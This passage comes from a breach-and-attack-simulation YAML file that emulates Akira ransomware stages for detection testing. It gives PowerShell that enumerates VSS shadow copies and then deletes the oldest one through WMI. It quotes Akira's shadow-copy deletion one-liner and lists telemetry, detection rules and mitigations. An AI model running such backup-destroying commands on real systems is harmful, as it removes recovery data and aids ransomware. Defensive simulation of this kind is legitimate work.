    command: |
      $ErrorActionPreference = 'Continue'
      $vssOut = & vssadmin.exe list shadows 2>&1 | Out-String
      $rc = $LASTEXITCODE
      $shadowCount = ([regex]::Matches($vssOut, 'Shadow Copy ID')).Count
      if ($rc -eq 0 -and $shadowCount -gt 0) {
        Write-Output "EXEC T1490: $shadowCount VSS shadow copy(ies) enumerated. Akira would now delete these via WMI Win32_ShadowCopy.Delete() to destroy backups. Sysmon EID 1 vssadmin.exe logged. [BAS-SIM-AKIRA-S7]"
        Write-Output "FAIL: VSS snapshots exist and are enumerable ($shadowCount found). If Akira reached this stage, backups would be destroyed before encryption. Ensure immutable cloud backup or Veeam hardened repo is NOT reachable from endpoint. [BAS-SIM-AKIRA-S7]"
      } elseif ($rc -eq 0) {
        Write-Output "PASS: vssadmin reports no shadow copies; the recovery inhibition surface is reduced on this host. Positive read of the configuration. [BAS-SIM-AKIRA-S7]"
      } elseif ($vssOut -match 'Access is denied') {
        Write-Output "PASS: vssadmin shadow listing was explicitly denied (Access is denied). Positive evidence of a control denial. [BAS-SIM-AKIRA-S7]"
      } else {
        Write-Output "SKIP: vssadmin listing failed (exit=$rc); shadow state unknown, not scored. [BAS-SIM-AKIRA-S7]"
      }
    cleanup: ""

  # ===========================================================================
  # Stage 8 — Recovery Inhibition B: VSS Deletion via WMI (T1490, lab-only)
  # ===========================================================================
  - id: akira-s8-vss-wmi-delete
    name: "Akira Stage 8 — VSS Shadow Copy Deletion via WMI (lab  -  requires BAS_CONFIRM_VSS_DELETE=true) (T1490)"
    irreversible: "Deleted VSS shadow copies cannot be restored by any cleanup step; recovery needs a backup taken before the run. Lab gate BAS_CONFIRM_VSS_DELETE is unchanged."
    technique_id: T1490
    action_key: vss_delete
    detection_profiles:
      - windows_vss_inhibition
    framework: custom
    executor: powershell
    requires_priv: admin
    timeout_sec: 60
    fidelity: lab-only
    production_safe: false
    risk: high
    severity: critical
    confidence: high
    reversible: false
    depends_on: [akira-s7-vss-enum]
    blast_radius: "Deletes ONE oldest VSS shadow copy of C: via WMI Win32_ShadowCopy.Delete() -- Akira's exact documented command style (CISA AA24-109A: 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete()}'), as opposed to LockBit/BlackCat's vssadmin-based deletion. Requires explicit BAS_CONFIRM_VSS_DELETE=true env var and verifies a snapshot exists first. Default-disabled without the flag."
    preconditions: ["Admin privilege.", "BAS_CONFIRM_VSS_DELETE=true.", "Isolated lab environment.", "At least one C: shadow copy exists."]
    postconditions: ["At most one oldest C: shadow copy deleted; remaining count emitted."]
    abort_on:
      - "BAS_CONFIRM_VSS_DELETE != 'true' → SKIP"
      - "No C: shadow copies → SKIP"
    telemetry:
      - "Security EID 8224 (VSS service shutdown) + EID 524 (shadow copy deletion)"
      - "PowerShell EID 4104: Get-WmiObject Win32_ShadowCopy | ForEach-Object Delete()"
    detection:
      - "EDR: PowerShell WMI-based shadow copy deletion (Win32_ShadowCopy.Delete())  -  Akira's documented signature VSS-kill pattern, distinct from vssadmin.exe"
      - "SIEM: shadow copy count decrease; alert if count drops to 0"
    expected_telemetry_count: 2
    false_positive_notes: "Storage-management scripts use Win32_ShadowCopy.Delete() — require change-window correlation."
    mitigations:
      - "Alert on Win32_ShadowCopy.Delete() from PowerShell."
      - "Immutable offsite backups; restrict shadow-copy management to dedicated accounts."
    references: ["CISA AA24-109A", "MITRE T1490"]
    evidence: ["Emit deleted_shadow_count + remaining."]
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $confirm = $env:BAS_CONFIRM_VSS_DELETE
      if (-not $confirm -or $confirm -ne 'true') {
        Write-Output "SKIP: BAS_CONFIRM_VSS_DELETE not set to 'true'  -  WMI-based VSS deletion skipped (default-disabled per ransomware safety policy). Set env var explicitly in isolated lab to enable. [BAS-SIM-AKIRA-S8]"
        return
      }
      # Win32_ShadowCopy.VolumeName is a \?\Volume{GUID}\ path, never a drive letter: resolve C: to its volume DeviceID first.
      $cVol = Get-WmiObject Win32_Volume -Filter "DriveLetter='C:'" -ErrorAction SilentlyContinue
      $shadows = @(); if ($cVol.DeviceID) { $shadows = @(Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object { $_.VolumeName -eq $cVol.DeviceID }) }
      if (-not $shadows -or @($shadows).Count -eq 0) {
        Write-Output "SKIP: no C: VSS shadow copies exist  -  nothing to delete. Create a snapshot first with: vssadmin create shadow /for=C:"
        return
      }
      $oldest = @($shadows | Sort-Object InstallDate)[0]
      $oldest.Delete()
      $remaining = @(Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object { $_.VolumeName -eq $cVol.DeviceID }).Count
      Write-Output "FAIL: VSS shadow copy deleted via WMI Win32_ShadowCopy.Delete() -- Akira's exact documented command is 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {\$_.Delete()}'. $remaining shadow copy/copies remaining on C:. Create a new snapshot to restore recovery capability. [BAS-SIM-AKIRA-S8]"
    cleanup: ""

